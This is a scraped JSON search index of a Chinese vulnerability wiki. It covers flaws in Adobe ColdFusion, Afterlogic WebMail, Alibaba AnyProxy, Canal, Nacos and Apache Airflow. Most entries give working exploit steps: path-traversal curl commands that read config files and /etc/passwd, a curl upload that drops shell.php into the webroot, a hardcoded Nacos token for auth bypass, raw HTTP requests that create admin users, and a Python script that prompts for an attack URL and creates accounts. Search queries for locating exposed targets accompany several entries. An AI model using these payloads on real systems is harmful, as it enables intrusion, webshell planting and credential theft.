","date":"0001-01-01","objectID":"/adobe-coldfusion-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21087/:3:0","tags":null,"title":"","uri":"/adobe-coldfusion-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21087/"},{"categories":null,"content":"漏洞复现 - method: GET path: - \"{{BaseURL}}/cf_scripts/scripts/ajax/package/cfajax.js\" - \"{{BaseURL}}/cf-scripts/scripts/ajax/package/cfajax.js\" - \"{{BaseURL}}/CFIDE/scripts/ajax/package/cfajax.js\" - \"{{BaseURL}}/cfide/scripts/ajax/package/cfajax.js\" - \"{{BaseURL}}/CF_SFSD/scripts/ajax/package/cfajax.js\" - \"{{BaseURL}}/cfide-scripts/ajax/package/cfajax.js\" - \"{{BaseURL}}/cfmx/CFIDE/scripts/ajax/package/cfajax.js\" regex: - 'eval\\(\\\"\\(\\\"\\+json\\+\\\"\\)\\\"\\)' ","date":"0001-01-01","objectID":"/adobe-coldfusion-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21087/:4:0","tags":null,"title":"","uri":"/adobe-coldfusion-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21087/"},{"categories":null,"content":"Afterlogic Aurora \u0026 WebMail Pro 任意文件读取CVE-2021-26294 ","date":"0001-01-01","objectID":"/afterlogic-aurora-webmail-pro-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2021-26294/:0:0","tags":null,"title":"","uri":"/afterlogic-aurora-webmail-pro-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2021-26294/"},{"categories":null,"content":"漏洞描述 攻击者可以通过caldav_public_user@localhost用户登录，不需要其它用户信息就可以读取配置文件从而获得敏感信息。 参考链接： http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26294 https://github.com/E3SEC/AfterLogic/blob/main/CVE-2021-26294-exposure-of-sensitive-information-vulnerability.md https://forum.ywhack.com/thread-115326-1-8.html ","date":"0001-01-01","objectID":"/afterlogic-aurora-webmail-pro-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2021-26294/:1:0","tags":null,"title":"","uri":"/afterlogic-aurora-webmail-pro-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2021-26294/"},{"categories":null,"content":"漏洞影响 WebMail Pro ≤ 7.7.9 Afterlogic Aurora ≤ 7.7.9 ","date":"0001-01-01","objectID":"/afterlogic-aurora-webmail-pro-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2021-26294/:2:0","tags":null,"title":"","uri":"/afterlogic-aurora-webmail-pro-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2021-26294/"},{"categories":null,"content":"漏洞复现 curl -u 'caldav_public_user@localhost:caldav_public_user' \"https://sample-mail.tld/dav/server.php/files/personal/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data/settings/settings.xml\" ","date":"0001-01-01","objectID":"/afterlogic-aurora-webmail-pro-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2021-26294/:3:0","tags":null,"title":"","uri":"/afterlogic-aurora-webmail-pro-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2021-26294/"},{"categories":null,"content":"Afterlogic Aurora \u0026 WebMail Pro 文件上传漏洞 CVE-2021-26293 ","date":"0001-01-01","objectID":"/afterlogic-aurora-webmail-pro-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-26293/:0:0","tags":null,"title":"","uri":"/afterlogic-aurora-webmail-pro-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-26293/"},{"categories":null,"content":"漏洞描述 该漏洞是由于Afterlogic Aurora \u0026 WebMail Pro中对上传的文件过滤和限制存在缺陷，攻击者可以通过上传恶意文件，从而执行任意代码。 参考链接： http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26293 https://github.com/E3SEC/AfterLogic/blob/main/CVE-2021-26293-rce-via-public-unrestricted-file-upload-vulnerability.md https://forum.ywhack.com/thread-115325-1-8.html ","date":"0001-01-01","objectID":"/afterlogic-aurora-webmail-pro-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-26293/:1:0","tags":null,"title":"","uri":"/afterlogic-aurora-webmail-pro-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-26293/"},{"categories":null,"content":"漏洞影响 WebMail Pro ≤ 7.7.9 Afterlogic Aurora ≤ 7.7.9 ","date":"0001-01-01","objectID":"/afterlogic-aurora-webmail-pro-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-26293/:2:0","tags":null,"title":"","uri":"/afterlogic-aurora-webmail-pro-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-26293/"},{"categories":null,"content":"漏洞复现 curl -T shell.php -u 'caldav_public_user@localhost:caldav_public_user' \"https://sample-mail.tld/dav/server.php/files/persona/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e/var/www/html/shell.php\" 默认路径为/var/www/html，也可能更改配置为其它路径，可以尝试其它方式获取。 curl -X DELETE -u 'caldav_public_user@localhost:caldav_public_user' \"https://sample-mail.tld/dav/server.php/files/personal/GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021\" //使用无效路径获取SabreDAV错误查看Webroot路径 ","date":"0001-01-01","objectID":"/afterlogic-aurora-webmail-pro-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-26293/:3:0","tags":null,"title":"","uri":"/afterlogic-aurora-webmail-pro-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-26293/"},{"categories":null,"content":"Alibaba AnyProxy fetchBody 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/alibaba-anyproxy-fetchbody-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/alibaba-anyproxy-fetchbody-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Alibaba AnyProxy 低版本存在任意文件读取，通过漏洞，攻击者可以获取服务器敏感信息 ","date":"0001-01-01","objectID":"/alibaba-anyproxy-fetchbody-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/alibaba-anyproxy-fetchbody-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Alibaba AnyProxy \u003c 4.0.10 ","date":"0001-01-01","objectID":"/alibaba-anyproxy-fetchbody-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/alibaba-anyproxy-fetchbody-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"anyproxy\" ","date":"0001-01-01","objectID":"/alibaba-anyproxy-fetchbody-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/alibaba-anyproxy-fetchbody-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 页面如下 验证POC为 /fetchBody?id=1/../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/alibaba-anyproxy-fetchbody-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/alibaba-anyproxy-fetchbody-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Alibaba Canal config 云密钥信息泄露漏洞 ","date":"0001-01-01","objectID":"/alibaba-canal-config-%E4%BA%91%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/alibaba-canal-config-%E4%BA%91%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 由于/api/v1/canal/config 未进行权限验证可直接访问，导致账户密码、accessKey、secretKey等一系列敏感信息泄露 ","date":"0001-01-01","objectID":"/alibaba-canal-config-%E4%BA%91%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/alibaba-canal-config-%E4%BA%91%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Alibaba Canal ","date":"0001-01-01","objectID":"/alibaba-canal-config-%E4%BA%91%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/alibaba-canal-config-%E4%BA%91%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Canal Admin\" ","date":"0001-01-01","objectID":"/alibaba-canal-config-%E4%BA%91%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/alibaba-canal-config-%E4%BA%91%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 验证漏洞的Url为 /api/v1/canal/config/1/0 其中泄露了 aliyun.access 密钥，可以控制密钥下的所有服务器 云密钥泄露参考: red.peiqi.tech 其中还含有默认口令 admin/123456 ","date":"0001-01-01","objectID":"/alibaba-canal-config-%E4%BA%91%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/alibaba-canal-config-%E4%BA%91%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Alibaba Nacos secret.key默认密钥 未授权访问漏洞 ","date":"0001-01-01","objectID":"/alibaba-nacos-secret.key%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/alibaba-nacos-secret.key%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Alibaba Nacos 使用了固定的secret.key默认密钥，导致攻击者可以构造请求获取敏感信息，导致未授权访问漏洞 ","date":"0001-01-01","objectID":"/alibaba-nacos-secret.key%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/alibaba-nacos-secret.key%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Alibaba Nacos \u003c= 2.2.0 ","date":"0001-01-01","objectID":"/alibaba-nacos-secret.key%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/alibaba-nacos-secret.key%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"NACOS\" ","date":"0001-01-01","objectID":"/alibaba-nacos-secret.key%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/alibaba-nacos-secret.key%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 漏洞原因是使用了固定的Key 验证POC /nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ\u0026pageNo=1\u0026pageSize=9 ","date":"0001-01-01","objectID":"/alibaba-nacos-secret.key%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/alibaba-nacos-secret.key%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Alibaba Nacos 未授权访问漏洞 ","date":"0001-01-01","objectID":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 2020年12月29日，Nacos官方在github发布的issue中披露Alibaba Nacos 存在一个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。 ","date":"0001-01-01","objectID":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Nacos \u003c= 2.0.0-ALPHA.1 ","date":"0001-01-01","objectID":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Nacos\" ","date":"0001-01-01","objectID":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 wget https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 tar -zxvf nacos-server-2.0.0-ALPHA.1.tar.gz ./startup.sh -m standalone 然后访问 http://xxx.xxx.xxx.xxx:8848/nacos 即可，默认账号密码 nacos/nacos ","date":"0001-01-01","objectID":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 可以再项目的 issues 中看到大量的关于越权的安全问题的讨论 https://github.com/alibaba/nacos/issues/1105 这里我们在登录后任意一个位置看一下请求，并在未授权的情况下看是否可以访问 这里的请求url简化为 http://xxx.xxx.xxx.xxx:8848/nacos/v1/core/cluster/nodes?withInstances=false\u0026pageNo=1\u0026pageSize=10\u0026keyword= 退出用户后在前台访问这个 url 可以发现以及泄露了 ip节点 等数据 同样我们查看用户列表的请求并在前台访问 http://xxx.xxx.xxx.xxx:8848/nacos/v1/auth/users?pageNo=1\u0026pageSize=9 这里可以发现对用户的请求是完全没有过滤的，可以通过未授权的情况获取用户的敏感信息 我们尝试创建用户并抓包 返回下列创建成功 {\"code\":200,\"message\":\"create user ok!\",\"data\":null} 同样的我们简化请求 POST /nacos/v1/auth/users? username=peiqi\u0026password=peiqi 看到有文章说要加上User-Agent请求头 User-Agent: Nacos-Server 但是大量测试之后发现好像是无关紧要的，没有请求头同样可以创建用户 同样的原理也可以用于修改密码添加配置等 ","date":"0001-01-01","objectID":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC # 添加用户 POST /nacos/v1/auth/users HTTP/1.1 Host: 127.0.0.1 User-Agent: Nacos-Server Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/ *;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 0 username=aaaa\u0026password=bbbb # 查看用户 GET /nacos/v1/auth/users?pageNo=1\u0026pageSize=100 HTTP/1.1 Host: 127.0.0.1 User-Agent: Nacos-Server Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*; q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Connection: close 注意下大部分企业的 nacos的url为 /v1/auth/users ，而不是 /nacos/v1/auth/users 可以按目标情况自行修改 import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Nacos \u003c= 2.0.0-ALPHA.1 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): # vuln_url = target_url + \"/nacos/v1/auth/users\" vuln_url = target_url + \"/v1/auth/users\" headers = { \"User-Agent\": \"Nacos-Server\", \"Content-Type\": \"application/x-www-form-urlencoded\", } number = random.randint(0,999) data = \"username=peiqi{}\u0026password=peiqi\".format(str(number)) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/nacos/v1/auth/users \\033[0m\".format(target_url)) if \"create user ok!\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 \\033[0m\".format(target_url)) print(\"\\033[32m[o] 成功创建账户 peiqi{} peiqi\\033[0m\".format(str(number))) else: print(\"\\033[31m[x] 创建用户请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:6:0","tags":null,"title":"","uri":"/alibaba-nacos-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Alibaba Nacos 集群 Raft 反序列化漏洞 CNVD-2023-45001 ","date":"0001-01-01","objectID":"/alibaba-nacos-%E9%9B%86%E7%BE%A4-raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cnvd-2023-45001/:0:0","tags":null,"title":"","uri":"/alibaba-nacos-%E9%9B%86%E7%BE%A4-raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cnvd-2023-45001/"},{"categories":null,"content":"漏洞描述 该漏洞源于 Nacos 集群处理部分 Jraft 请求时，未限制使用 hessian 进行反 。序列化，攻击者可以通过发送特制的请求触发该漏洞，最终执行任意远程代码。 ","date":"0001-01-01","objectID":"/alibaba-nacos-%E9%9B%86%E7%BE%A4-raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cnvd-2023-45001/:1:0","tags":null,"title":"","uri":"/alibaba-nacos-%E9%9B%86%E7%BE%A4-raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cnvd-2023-45001/"},{"categories":null,"content":"漏洞影响 1.4.0 \u003c= Nacos \u003c 1.4.6 2.0.0 \u003c= Nacos \u003c 2.2.3 ","date":"0001-01-01","objectID":"/alibaba-nacos-%E9%9B%86%E7%BE%A4-raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cnvd-2023-45001/:2:0","tags":null,"title":"","uri":"/alibaba-nacos-%E9%9B%86%E7%BE%A4-raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cnvd-2023-45001/"},{"categories":null,"content":"漏洞复现 exp：https://github.com/c0olw/NacosRce/ ","date":"0001-01-01","objectID":"/alibaba-nacos-%E9%9B%86%E7%BE%A4-raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cnvd-2023-45001/:3:0","tags":null,"title":"","uri":"/alibaba-nacos-%E9%9B%86%E7%BE%A4-raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cnvd-2023-45001/"},{"categories":null,"content":"漏洞修复 默认配置下该漏洞仅影响 Nacos 集群间 Raft 协议通信的 7848 端口，此端口不承载客户端请求，可以通过限制集群外部 IP 访问 7848 端口来进行缓解。 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本：https://github.com/alibaba/nacos/releases ","date":"0001-01-01","objectID":"/alibaba-nacos-%E9%9B%86%E7%BE%A4-raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cnvd-2023-45001/:4:0","tags":null,"title":"","uri":"/alibaba-nacos-%E9%9B%86%E7%BE%A4-raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cnvd-2023-45001/"},{"categories":null,"content":"Alibaba otter manager分布式数据库同步系统信息泄漏 CNVD-2021-16592 ","date":"0001-01-01","objectID":"/alibaba-otter-manager%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8C%E6%AD%A5%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cnvd-2021-16592/:0:0","tags":null,"title":"","uri":"/alibaba-otter-manager%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8C%E6%AD%A5%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cnvd-2021-16592/"},{"categories":null,"content":"漏洞描述 Alibaba otter manager分布式数据库同步系统是基于数据库增量日志解析，准实时同步到本机房或异地机房的mysql/oracle数据库，一个分布式数据库同步系统。阿里巴巴otter manager分布式数据库同步系统存在信息泄露漏洞，攻击者可利用漏洞获取zookper信息。 参考链接： https://www.cnvd.org.cn/flaw/show/CNVD-2021-16592 https://forum.ywhack.com/thread-115309-1-8.html ","date":"0001-01-01","objectID":"/alibaba-otter-manager%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8C%E6%AD%A5%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cnvd-2021-16592/:1:0","tags":null,"title":"","uri":"/alibaba-otter-manager%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8C%E6%AD%A5%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cnvd-2021-16592/"},{"categories":null,"content":"网络测绘 title=\"Otter Manager\" ","date":"0001-01-01","objectID":"/alibaba-otter-manager%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8C%E6%AD%A5%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cnvd-2021-16592/:2:0","tags":null,"title":"","uri":"/alibaba-otter-manager%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8C%E6%AD%A5%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cnvd-2021-16592/"},{"categories":null,"content":"漏洞复现 默认口令：admin/admin 进入后直接f12查看元素，修改password为text即可查看数据库等敏感信息密码。 ","date":"0001-01-01","objectID":"/alibaba-otter-manager%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8C%E6%AD%A5%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cnvd-2021-16592/:3:0","tags":null,"title":"","uri":"/alibaba-otter-manager%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8C%E6%AD%A5%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cnvd-2021-16592/"},{"categories":null,"content":"Apache Airflow 远程代码执行漏洞 CVE-2022-40127 ","date":"0001-01-01","objectID":"/apache-airflow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40127/:0:0","tags":null,"title":"","uri":"/apache-airflow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40127/"},{"categories":null,"content":"漏洞描述 Apache Airflow 是一个可编程，调度和监控的工作流平台，基于有向无环图（DAG），Airflow 可以定义一组有依赖的任务，按照依赖依次执行。 当攻击者可访问到 Apache Airflow 的后台，且环境中存在默认 Example Dags，则可构造恶意请求借助 run_id 执行任意命令。 